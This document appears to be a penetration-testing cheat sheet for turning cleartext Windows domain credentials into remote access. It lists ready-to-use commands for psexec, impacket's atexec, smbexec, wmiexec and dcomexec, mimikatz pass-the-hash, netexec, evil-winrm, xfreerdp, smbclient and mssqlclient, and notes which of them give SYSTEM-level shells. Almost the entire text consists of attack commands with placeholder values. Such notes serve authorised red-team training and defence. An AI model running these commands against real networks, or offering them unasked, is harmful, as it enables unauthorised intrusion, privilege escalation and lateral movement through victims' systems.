# Cleartext Password

## Tools: psexec.exe , impacket tools , mimikatz , crackmapexec/netexec , evil-winrm , xfreerdp , mssqlclient

# Interactive shell

#### 1) psexec.exe/impacket-psexec

 - psexec.exe -AcceptEULA \\IP

 - impacket-psexec DOMAIN/USER:PASSWORD@IP

## This grants NT Authority/System shell (System/Admin access)

#### 2) Mimikatz

 - mimikatz "privilege::debug sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:HASH"

# Pseudo-shell (File write and read)

#### 1) crackmapexec/netexec

 - netexec smb IP_RANGE -u USER -p PASSWORD -d DOMAIN

 - netexec smb IP_RANGE -u USER -p PASSWORD --local-auth

#### 2) Impacket tools

 - atexec.py DOMAIN/USER:PASSWORD@IP "COMMAND"

 - smbexec.py DOMAIN/USER:PASSWORD@IP

## Note: These 2 techniques grant shell as the NT Authority/System user

 - wmiexec.py DOMAIN/USER:PASSWORD@IP

 - dcomexec.py DOMAIN/USER:PASSWORD@IP

### These techniques grant System/Admin access

# WinRM

 - evil-winrm -i IP -u USER -p PASSWORD

# RDP

 - xfreerdp /u:USER /d:DOMAIN /p:PASSWORD /v:IP

# SMB

 - smbclient.py DOMAIN/USER:PASSWORD@IP (Search files)

# MSSQL

 - mssqlclient.py -windows-auth DOMAIN/USER:PASSWORD@IP (MSSQL Pivot)
